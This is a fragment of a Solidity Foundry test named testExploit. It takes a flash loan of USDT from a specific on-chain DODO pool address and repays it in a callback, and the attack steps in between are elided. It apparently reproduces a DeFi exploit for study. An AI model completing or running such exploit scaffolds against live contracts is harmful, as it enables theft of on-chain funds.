...
contract ContractTest is Test {
    ...
    address constant private dodo_pool = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
    ...
    function testExploit() public {
        IDPPOracle(dodo_pool).flashLoan(0, 300000000000000008388608, address(this), new bytes(1));
    }
    ...
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
        ...
        // pay back
        IERC20(usdt).transfer(msg.sender, 300000000000000008388608);
